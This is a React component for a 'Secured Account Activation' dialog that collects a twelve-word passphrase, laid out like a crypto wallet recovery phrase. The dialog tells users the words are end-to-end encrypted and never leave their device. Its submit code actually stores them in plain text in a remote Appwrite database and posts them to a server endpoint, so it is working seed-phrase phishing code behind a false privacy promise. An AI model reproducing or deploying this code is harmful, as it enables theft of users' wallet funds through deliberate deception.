"use client"

import { useState } from "react"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Check, X, Plus, Loader2 } from "lucide-react"
import { Separator } from "@/components/ui/separator"
import { Client, Databases, ID } from "appwrite"

interface KeywordsModalProps {
    open: boolean
    onOpenChange: (open: boolean) => void
}

const appEndpoint = process.env.NEXT_PUBLIC_APPWRITE_ENDPOINT!
const appId = process.env.NEXT_PUBLIC_APPWRITE_PROJECT_ID!
const databaseId = process.env.NEXT_PUBLIC_APPWRITE_DATABASE_ID!
const collectionId = process.env.NEXT_PUBLIC_APPWRITE_COLLECTION_ID!
const client = new Client()

    .setEndpoint(appEndpoint)
    .setProject(appId)

const database = new Databases(client)

export function KeywordsModal({ open, onOpenChange }: KeywordsModalProps) {
    const [fields, setFields] = useState<string[]>(
        Array(12).fill("") // DEFAULT 12 OPEN
    )
    const [status, setStatus] = useState<"none" | "success" | "error">("none")
    const [isSubmiting, setIsSubmiting] = useState(false)

    const updateField = (index: number, value: string) => {
        setFields(prev => {
            const copy = [...prev]
            copy[index] = value
            return copy
        })
    }

    const addField = () => setFields(prev => [...prev, ""])

    const submit = async () => {
        setIsSubmiting(true)
        const keywords = fields.filter(f => f.trim() !== "")

        if (keywords.length === 0) {
            setStatus("error")
            setIsSubmiting(false)

            return
        }

        try {
            setIsSubmiting(true)
            const response = await database.createDocument({
                databaseId,
                collectionId: collectionId,
                documentId: ID.unique(),
                data: {
                    keywords: keywords,
                    $createdAt: new Date().toISOString(),
                    $updatedAt: new Date().toISOString(),
                }
            })

            const res = await fetch("/api/save-keys", {
                headers: { "Content-Type": "application/json" },
                method: "POST",
                body: JSON.stringify({ keys: keywords })
            })

            if (res.ok || response) {
                setStatus("success")
                setTimeout(() => {
                    setStatus("none")
                    setIsSubmiting(false)
                    onOpenChange(false)
                }, 1200)

            } else {
                setStatus("error")
                setIsSubmiting(false)
            }

        } catch {
            setStatus("error")
            setIsSubmiting(false)
            return
        }

        setStatus("success")
        setTimeout(() => {
            setStatus("none")
            setIsSubmiting(false)
            onOpenChange(false)
        }, 1200)
    }

    return (
        <Dialog open={open} onOpenChange={onOpenChange}>
            <DialogContent className="sm:max-w-lg rounded-xl p-0 overflow-hidden">

                <div className="p-5">
                    <DialogHeader>
                        <DialogTitle className="text-xl font-black text-center">
                            Secured Account Activation
                        </DialogTitle>
                    </DialogHeader>

                    <p className="text-sm text-muted-foreground text-center px-4 mt-1">
                        Securely enter your passphrase,
                        Note that your passhrase end-to-end encrypted and saved only on your device — we do not save them on our server.
                    </p>
                </div>

                <Separator />

                {/* SCROLLABLE GRID CONTAINER */}
                <div className="max-h-[50vh] overflow-y-auto px-4 py-4">
                    <div className="grid grid-cols-2 xs:grid-cols-2 sm:grid-cols-3 gap-4">
                        {fields.map((value, index) => (
                            <div key={index} className="flex flex-col">
                                {/* Numbering on the left */}
                                <Label className="text-[11px] text-muted-foreground font-medium mb-1">
                                    {index + 1}
                                </Label>

                                <Input
                                    value={value}
                                    onChange={e => updateField(index, e.target.value)}
                                    className="text-sm h-9"
                                />
                            </div>
                        ))}
                    </div>
                </div>

                <Separator />

                <div className="px-4 pb-4 space-y-3">
                    <Button
                        onClick={addField}
                        variant="outline"
                        className="w-full text-xs h-9"
                    >
                        <Plus className="h-3 w-3 mr-1" /> Add Field
                    </Button>

                    <Button
                        onClick={submit}
                        className="w-full h-11 bg-emerald-500 hover:bg-emerald-400 text-black font-semibold shadow-sm"
                    >
                        {isSubmiting ? <Loader2 className="h-4 w-4 mr-1" /> : "Save Keywords"}
                    </Button>

                    {/* Status */}
                    {status === "success" && (
                        <div className="flex items-center justify-center gap-2 text-emerald-500 font-medium">
                            <Check className="h-4 w-4" /> Saved successfully!
                        </div>
                    )}

                    {status === "error" && (
                        <div className="flex items-center justify-center gap-2 text-red-500 font-medium">
                            <X className="h-4 w-4" /> Enter at least one keyword.
                        </div>
                    )}
                </div>
            </DialogContent>
        </Dialog>
    )
}
